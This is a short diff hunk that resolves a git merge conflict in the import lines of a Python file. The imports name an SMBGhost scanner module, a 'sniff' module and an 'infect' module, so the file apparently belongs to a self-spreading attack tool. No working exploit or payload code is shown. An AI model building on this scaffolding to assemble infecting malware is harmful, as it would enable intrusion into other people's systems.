@@ -1,8 +1,4 @@
-<<<<<<< HEAD
 import pickle, os, platform
-=======
-import pickle, time
->>>>>>> refs/remotes/origin/main
 import armory.SMBGhost.cve20220796scanner as cve20220796scanner
 from sniff import sniff
 from infect import infect
